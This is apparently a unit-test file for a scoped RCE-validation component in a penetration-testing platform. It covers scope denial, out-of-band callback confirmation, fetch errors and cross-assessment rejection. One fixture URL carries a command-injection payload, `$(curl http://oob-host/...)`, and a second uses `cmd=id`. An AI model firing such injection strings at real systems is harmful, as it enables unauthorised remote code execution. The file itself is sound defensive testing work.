// Sprint 20 — unit tests for rce-validator.ts.
//
// Covers:
//   1. Scope deny path (decide returns denied) — callCount === 0
//   2. Confirmed via OOB callback match
//   3. Unmatched (no OOB callback in window) → unmatched audit
//   4. Fetch error → fetch_failed audit + terminal result
//   5. Cross-assessment mismatch (worker-level) → replay_denied reason:assessment_mismatch

import { describe, expect, test } from 'bun:test';
import type { JobEnvelope } from '@cyberstrike/queue';
import {
  DEFAULT_PLATFORM_POLICY,
  type EffectiveScope,
  type ToolPolicy,
  buildEffectiveScope,
} from '@cyberstrike/scope-engine';
import { type RceValidatorInput, validateRceCandidate } from './rce-validator.ts';
import { handleRceReplay } from './worker.ts';
import type { AuditEmitterArgs, ValidatorWorkerDeps } from './worker.ts';

const VALID_TRACE = '0123456789abcdef0123456789abcdef';
const TENANT = '11111111-1111-1111-1111-111111111111';
const ASSESSMENT = '22222222-2222-2222-2222-222222222222';
const ASSESSMENT_B = 'cccccccc-cccc-cccc-cccc-cccccccccccc';
const CANDIDATE = '33333333-3333-3333-3333-333333333333';
const TOKEN = `${CANDIDATE}.${TENANT}.abcd1234`;
const AFFECTED_URL = `http://target.local/api?cmd=$(curl http://oob-host/${TOKEN})&_cs_token=${TOKEN}`;

const TOOL_CATALOG = new Map<string, ToolPolicy>();
const SCOPE_BASE = {
  tenantId: TENANT,
  assessmentId: ASSESSMENT,
  tenantPolicy: { tenantId: TENANT },
  platformPolicy: DEFAULT_PLATFORM_POLICY,
  toolCatalog: TOOL_CATALOG,
  assessmentFlags: { highImpactCategories: [], ownershipVerifiedTargetIds: new Set<string>() },
  timeWindow: null,
} as const;

// Scope that denies: empty rawRules → no_matching_allow_rule.
const makeDenyScope = (): EffectiveScope => buildEffectiveScope({ ...SCOPE_BASE, rawRules: [] });

// Scope that allows target.local:80 HTTP GET.
const makeAllowScope = (): EffectiveScope =>
  buildEffectiveScope({
    ...SCOPE_BASE,
    rawRules: [
      {
        id: 'r1',
        ruleKind: 'domain',
        effect: 'allow',
        payload: { pattern: 'target.local', matchSubdomains: false },
      },
      { id: 'r2', ruleKind: 'protocol', effect: 'allow', payload: { protocol: 'http' } },
      { id: 'r3', ruleKind: 'port', effect: 'allow', payload: { port: 80 } },
      { id: 'r4', ruleKind: 'http_method', effect: 'allow', payload: { method: 'GET' } },
      { id: 'r5', ruleKind: 'path_pattern', effect: 'allow', payload: { glob: '/**' } },
    ],
  });

const makeInput = (scope: EffectiveScope): RceValidatorInput => ({
  candidateFindingId: CANDIDATE,
  tenantId: TENANT,
  assessmentId: ASSESSMENT,
  projectId: null,
  affectedUrl: AFFECTED_URL,
  token: TOKEN,
  scope,
  traceId: VALID_TRACE,
});

interface CapturedAudit {
  action: string;
  outcome: string;
  metadata: Record<string, unknown>;
}

const makeAuditCapture = (): {
  emitter: (args: AuditEmitterArgs) => Promise<void>;
  audits: CapturedAudit[];
} => {
  const audits: CapturedAudit[] = [];
  return {
    emitter: async (args: AuditEmitterArgs) => {
      audits.push({
        action: String(args.action),
        outcome: String(args.outcome),
        metadata: args.metadata,
      });
    },
    audits,
  };
};

// httpClient that resolves void (RCE doesn't read response body — just triggers the shell cmd).
const makeHttpClient = (
  shouldThrow?: Error,
): { get: (url: string) => Promise<void>; callCount: number } => {
  let callCount = 0;
  return {
    get: async (_url: string) => {
      callCount++;
      if (shouldThrow) throw shouldThrow;
    },
    get callCount() {
      return callCount;
    },
  };
};

const allowScopeDeps = {
  dns: {
    resolveA: async (host: string): Promise<string[]> => {
      if (host === 'target.local') return ['203.0.113.1'];
      return [];
    },
    resolveAAAA: async (): Promise<string[]> => [],
  },
  clock: { now: () => new Date() },
  rateLimit: { consume: async () => ({ ok: true as const, retryAfterMs: 0 }) },
};

const denyScopeDeps = {
  dns: { resolveA: async () => [] as string[], resolveAAAA: async () => [] as string[] },
  clock: { now: () => new Date() },
  rateLimit: { consume: async () => ({ ok: true as const, retryAfterMs: 0 }) },
};

// ──────────────────────────────────────────────
// Test 1 — scope deny
// ──────────────────────────────────────────────
describe('rce-validator :: scope deny', () => {
  test('decide denied → out_of_scope, replay_denied audit, callCount === 0', async () => {
    const { emitter, audits } = makeAuditCapture();
    const httpClient = makeHttpClient();
    const result = await validateRceCandidate(makeInput(makeDenyScope()), {
      scopeDeps: denyScopeDeps,
      auditEmitter: emitter,
      httpClient,
      oobCallbackLoader: async () => false,
      oobVerifyTimeoutMs: 100,
    });
    expect(result.status).toBe('out_of_scope');
    expect(httpClient.callCount).toBe(0);
    expect(audits).toHaveLength(1);
    expect(audits[0]?.action).toBe('validator.rce.replay_denied');
    expect(audits[0]?.outcome).toBe('denied');
  });
});

// ──────────────────────────────────────────────
// Test 2 — confirmed via OOB callback match
// ──────────────────────────────────────────────
describe('rce-validator :: confirmed', () => {
  test('fetch succeeds + oob match → confirmed, rce.confirmed audit', async () => {
    const { emitter, audits } = makeAuditCapture();
    const httpClient = makeHttpClient();
    const result = await validateRceCandidate(makeInput(makeAllowScope()), {
      scopeDeps: allowScopeDeps,
      auditEmitter: emitter,
      httpClient,
      oobCallbackLoader: async () => true,
      oobVerifyTimeoutMs: 1000,
    });
    expect(result.status).toBe('confirmed');
    expect(httpClient.callCount).toBe(1);
    expect(audits).toHaveLength(1);
    expect(audits[0]?.action).toBe('validator.rce.confirmed');
    expect(audits[0]?.outcome).toBe('success');
    expect(audits[0]?.metadata.token).toBe(TOKEN);
  });
});

// ──────────────────────────────────────────────
// Test 3 — unmatched (no OOB callback in window)
// ──────────────────────────────────────────────
describe('rce-validator :: unmatched', () => {
  test('fetch succeeds + no oob callback → unmatched, rce.unmatched audit', async () => {
    const { emitter, audits } = makeAuditCapture();
    const httpClient = makeHttpClient();
    const result = await validateRceCandidate(makeInput(makeAllowScope()), {
      scopeDeps: allowScopeDeps,
      auditEmitter: emitter,
      httpClient,
      oobCallbackLoader: async () => false,
      oobVerifyTimeoutMs: 50, // tiny timeout so test is fast
    });
    expect(result.status).toBe('unmatched');
    expect(httpClient.callCount).toBe(1);
    expect(audits).toHaveLength(1);
    expect(audits[0]?.action).toBe('validator.rce.unmatched');
    expect(audits[0]?.outcome).toBe('success');
    expect(audits[0]?.metadata.token).toBe(TOKEN);
  });
});

// ──────────────────────────────────────────────
// Test 4 — fetch error → fetch_failed terminal
// ──────────────────────────────────────────────
describe('rce-validator :: fetch error', () => {
  test('httpClient.get throws → fetch_failed audit + terminal result (S19 MED-1 regression)', async () => {
    const { emitter, audits } = makeAuditCapture();
    const fetchError = new Error('ECONNREFUSED');
    const httpClient = makeHttpClient(fetchError);
    const result = await validateRceCandidate(makeInput(makeAllowScope()), {
      scopeDeps: allowScopeDeps,
      auditEmitter: emitter,
      httpClient,
      oobCallbackLoader: async () => {
        throw new Error('should not be called');
      },
      oobVerifyTimeoutMs: 1000,
    });
    expect(result.status).toBe('fetch_failed');
    expect(result.reason).toBe('ECONNREFUSED');
    expect(httpClient.callCount).toBe(1);
    expect(audits).toHaveLength(1);
    expect(audits[0]?.action).toBe('validator.rce.fetch_failed');
    expect(audits[0]?.outcome).toBe('denied');
    expect(audits[0]?.metadata.error).toBe('ECONNREFUSED');
  });
});

// ──────────────────────────────────────────────
// Test 5 — cross-assessment mismatch (worker-level)
// ──────────────────────────────────────────────
describe('rce-validator :: cross-assessment mismatch (worker)', () => {
  test('candidate assessmentId !== payload assessmentId → replay_denied assessment_mismatch, no http call, no finding', async () => {
    const { emitter, audits } = makeAuditCapture();
    const httpClient = makeHttpClient();
    const findingsInserted: unknown[] = [];

    // Candidate belongs to ASSESSMENT, payload claims ASSESSMENT_B.
    const candidateRow = {
      id: CANDIDATE,
      tenantId: TENANT,
      assessmentId: ASSESSMENT, // real assessment
      type: 'rce' as const,
      severity: 'high' as const,
      affectedUrl: 'http://target.local/api?cmd=id',
      source: 'decepticon',
      payload: {},
    };

    const workerDeps: ValidatorWorkerDeps = {
      driver: {} as ValidatorWorkerDeps['driver'],
      objectStorage: {} as ValidatorWorkerDeps['objectStorage'],
      buildScope: async () => makeAllowScope(),
      scopeDeps: allowScopeDeps,
      auditEmitter: emitter,
      candidateLoader: async () => candidateRow,
      assessmentLoader: async () => ({
        id: ASSESSMENT_B,
        tenantId: TENANT,
        projectId: null,
      }),
      findingsWriter: async (input) => {
        findingsInserted.push(input);
        return { id: 'fake-finding-id' };
      },
      findingEvidenceWriter: async () => ({ id: 'fake-evidence-id' }),
      findingByCandidateLoader: async () => null,
      evidenceCounter: async () => 0,
      findingCreatedAuditChecker: async () => false,
      payloadSchema: {} as ValidatorWorkerDeps['payloadSchema'],
      rceHttpClient: httpClient,
      oobCallbackLoader: async () => true,
      oobVerifyTimeoutMs: 1000,
    };

    const envelope: JobEnvelope = {
      jobId: 'job-1',
      tenantId: TENANT,
      projectId: null,
      assessmentId: ASSESSMENT_B, // mismatched
      kind: 'validator.rce.replay',
      idempotencyKey: 'ikey-1',
      createdAt: new Date().toISOString(),
      attempt: 0,
      maxAttempts: 3,
      traceId: VALID_TRACE,
      payload: {
        tenantId: TENANT,
        projectId: null,
        assessmentId: ASSESSMENT_B, // mismatched
        candidateFindingId: CANDIDATE,
        candidateType: 'rce',
        affectedUrl: AFFECTED_URL,
        token: TOKEN,
        traceId: VALID_TRACE,
      },
    };

    const outcome = await handleRceReplay(workerDeps, envelope);

    // Terminal ack — not a nack.
    expect(outcome.kind).toBe('ack');
    // No HTTP call made.
    expect(httpClient.callCount).toBe(0);
    // No finding inserted.
    expect(findingsInserted).toHaveLength(0);
    // Denial audit with assessment_mismatch.
    const denialAudit = audits.find((a) => a.action === 'validator.rce.replay_denied');
    expect(denialAudit).toBeDefined();
    expect(denialAudit?.metadata.reason).toBe('assessment_mismatch');
  });
});
